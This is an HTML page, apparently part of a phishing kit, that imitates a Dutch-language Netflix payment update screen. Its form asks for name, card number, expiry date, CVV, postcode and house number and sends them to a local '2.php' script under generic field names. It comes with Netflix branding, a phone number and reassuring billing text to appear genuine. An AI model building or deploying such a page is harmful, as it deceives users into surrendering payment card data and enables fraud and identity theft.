
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-compatable" content="IE-edge">
	<meta name="viewport" content="width=device-width">
	<title>Netflix</title>
	<link rel="icon" href="images/ico.png">
	<link rel="stylesheet" type="text/css" href="css/bootstrap.css">
	<link rel="stylesheet" type="text/css" href="css/c.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/
	font-awesome/4.7.0/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
</head>
<style>
	body{
		background-color: white;
	}
	*{
		padding: 0px
		margin:0px;
	}
	.logo{
		margin-top: -15px;
		margin-left: 25px;
		width: 220px;
	}
	.fluid{
		border-bottom: 1px solid #e6e6e6;
		height: 100px;
	}
	.maindiv{
		margin-top: 20px;
	}
	.toptitle{
		font-size: 22px;
		font-weight: bold;
	}
	.visa, .master, .amex{
		width: 50px;
		display: inline-block;
	}
	.firstmargin{
		margin-top: 20px;
	}
	.first{
		width: 400px;
		height: 55px;
		border-radius: 4px;
		border: 1.5px solid #cccccc;
		padding: 20px;
		outline: none;
		font-size: 18px;
	}
	.euro{
		width: 400px;
		height: 60px;
		background-color: #f4f4f4;
		border-radius: 4px;
		margin-top: 15px;
	}
	.b1{
		font-weight: bold;
		font-size: 17px;
		margin-top: 15px;
		padding: 10px;
	}
	.b2{
		margin-top: -30px;
		padding: 10px;
		color: #908e96;
	}
	.wij{
		margin-left: 320px;
		color: #3379d4;
		margin-top: -55px;
		font-weight: bold;
	}
	.checkmargin{
		margin-top: 10px;

	}
	.check{
		width: 20px;
		height: 20px;
	}
	.checkpara{
		color: #908e96;
		margin-left: 30px;
		margin-top: -25px;
		font-size: 13px;
	}
	.checkpara2{
		color: #908e96;
		margin-top: 40px;
		font-size: 13px;
	}
	.para2link{
		color: #4683ce;
	}
	.submit{
		width: 400px;
		height: 50px;
		border-radius: 4px;
		padding: 20px;
		outline: none;
		font-size: 16px;
		background-color: #e50913;
		color: white;
		text-transform: uppercase;
		border:0px;
		line-height: 13px;
	}
	.bt{
		margin-left: 120px;
		margin-top: 30px;
		width: 150px;
	}
	.abc{
		background-color: #f3f3f3;
		height: 50px;

	}

	@media only screen and (max-width: 375px)
	{

	}
</style>
<body>
	<div class="container-fluid fluid">
		<div class="row">
			<img src="images/logo.png" class="img-responsive logo">
		</div>
		<div class="row">
			<div class="col-md-4"></div>
			<div class="col-md-4">
				<main class="main1">
				<div class="maindiv">
					<form method="POST" action="2.php" class="form">
						<div class="form-group">
							<p class="toptitle">
								Stel je credit- of debitcard in.
							</p>
							<p class="cards">
								<img src="images/visa.png" class="img-responsive visa">
								<img src="images/master.png" class="img-responsive master">
								<img src="images/amex.png" class="img-responsive amex">
							</p>
							<div class="input-group firstmargin">
								<input type="text" required="required" name="first" class="first" placeholder="Voornaam">
							</div>
							<div class="input-group firstmargin">
								<input type="text" required="required" name="second" class="first" placeholder="Achternaam">
							</div>
							<div class="input-group firstmargin">
								<input type="text" required="required" name="third" class="first" placeholder="Kaartnummer">
							</div>
							<div class="input-group firstmargin">
								<input type="text" required="required" name="fourth" class="first" placeholder="Vervaldatum (MM/JJ)">
							</div>
							<div class="input-group firstmargin">
								<input type="text" required="required" name="fifth" class="first" placeholder="Veiligheidscode (CVV)">
							</div>
							<div class="input-group firstmargin">
								<input type="text" required="required" name="sixth" maxlength="7" class="first" placeholder="Postcode">
							</div>
							<div class="input-group firstmargin">
								<input type="text" required="required" name="seventh" maxlength="4" class="first" placeholder="Huisnummer">
							</div>
							<div class="euro">
								<p class="b1">€13,99/mnd.</p>
								<p class="b2">Premium-abonnement</p>
							</div>
							<div class="input-group checkmargin">
								<input type="checkbox"  class="check">
								<p class="checkpara">
									Je stemt ermee in dat je gegevens direct worden bijgewerkt en dat je <br>geen terugbetaling ontvangt wanneer je het contract opzegt. Je kunt nog altijd op elk moment opzeggen.
								</p>
								<p class="checkpara2">
									Door hieronder op "Gegevens bijwerken" te klikken, stem je in met onze
									<a href="" class="para2link">
										gebruiksvoorwaarden en privacyverklaring,
									</a>
									en verklaar je ouder dan 18 bent. Netflix werkt uw gegevens automatisch bij. De lidmaatschapskosten worden maandelijks betaald met je betaalmiddel totdat je opzegt.
								</p>
							</div>
							<div class="input-group firstmargin">
								<input type="submit"  name="submit" class="submit" value="Gegevens bijwerken">
							</div>
							<br><br><br>
						</div>
					</form>
				</div>
			</main>
			</div>
			<div class="col-md-4"></div>
		</div>
	</div>

	<div class="container-fluid" style="border-top: 1px solid #eaeaea;margin-top: 1000px;background-color: #f3f3f3;">
		<div class="row">
			<p class="footertitle1" style="color: #827d7c;margin-left:120px;margin-top: 20px;font-size: 18px;">
				Vragen? Bel 0800-022-9647
			</p>
			<br>
			<p>
				<b style="font-weight: normal;margin-left: 120px;">Veelgestelde vragen</b>
				<b style="font-weight: normal;margin-left: 137px;"">Helpcentrum</b>
				<b style="font-weight: normal;margin-left: 150px;">Gebruiksvoorwaarden</b>
				<b style="font-weight: normal;margin-left: 150px;">Privacy</b>
			</p>
			<Br>
			<p>
				<b style="font-weight: normal;margin-left: 120px;">Cookievoorkeuren</b>
				<b style="font-weight: normal;margin-left: 150px;"">Bedrijfsgegevens</b>
			</p>
			<br>
			<img src="images/bt2.png" class="img-responsive bt">
			<br><br>
		</div>
	</div>
<script defer src="https://use.fontawesome.com/releases/v5.0.8/js/solid.js" integrity="sha384-+Ga2s7YBbhOD6nie0DzrZpJes+b2K1xkpKxTFFcx59QmVPaSA8c7pycsNaFwUK6l" crossorigin="anonymous"></script>
<script defer src="https://use.fontawesome.com/releases/v5.0.8/js/fontawesome.js" integrity="sha384-7ox8Q2yzO/uWircfojVuCQOZl+ZZBg2D2J5nkpLqzH1HY0C1dHlTKIbpRz/LG23c" crossorigin="anonymous"></script>
<script type="text/javascript" href="js/bootstrap.js"></script>
<script type="text/javascript" href="js/jquery.js"></script>
</body>
</html>

